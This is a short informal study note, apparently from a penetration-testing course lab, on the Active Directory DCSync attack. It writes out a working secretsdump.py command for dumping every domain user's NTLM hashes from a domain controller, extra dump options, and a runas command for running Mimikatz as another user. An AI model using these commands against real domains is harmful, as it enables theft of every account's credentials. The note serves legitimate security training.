# DSYNC Attack

`Using the Replication Rights to Dump the NTDS.dit FILE`

- We can mimic a domain controller and retrieve NTLM Hashes of all users, including , Kerberos TGT ServiceAccount >D

The privilige needed to attack

`DS-Replication-Get-Changes-All`

Its common to find accounts with this privilige.

DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.

Attack via Secretsdump
`secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5` 

<aside>
💡

Other Usefull Options on SDump.py

</aside>

`-just-dc-ntlm` Retrieves ntlm hashes

`-user-status` Check if this account is disabled.

Passwords of users stroed via Reversible encryption would be dumped aswell, since we are the dc, we can extract the secret to decrypt passw0rds aswell, not every account has this setting obv.

<aside>
💡

Combining Runas And Mimikatz to perform DSYNC.

</aside>

Runas to run a powershell session as a user, which is crazy !!!.

`runas /netonly /user:INLANEFREIGHT\user powershell`

Allways keep this in mind.

[ActiveDirectory Module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps)